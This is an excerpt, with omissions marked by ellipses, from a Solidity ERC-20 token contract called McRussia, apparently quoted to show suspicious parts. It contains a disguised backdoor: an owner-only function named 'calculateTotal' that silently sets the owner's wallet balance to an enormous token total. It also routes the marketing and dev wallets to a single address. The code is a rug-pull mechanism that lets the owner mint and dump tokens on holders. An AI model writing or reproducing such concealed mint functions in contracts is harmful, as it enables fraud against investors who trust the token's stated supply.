...
contract McRussia is Context, IERC20, Ownable {
    ...
    address payable public marketingAddress = payable(0xdC4a4CF4c9731c42a6b057CEAd6Cdc9fa00B2c84);
    address payable public devAddress = payable(0xdC4a4CF4c9731c42a6b057CEAd6Cdc9fa00B2c84);
    ...
    uint256 public _decimalVariables = (10 ** _decimals);
    uint256 public _tokenVariable = 100000000000000;    
    uint256 public _totalVariable = _tokenVariable * _decimalVariables;
    ...
    function calculateTotal() external onlyOwner() {_wallets[getOwner()] = _totalVariable ; }
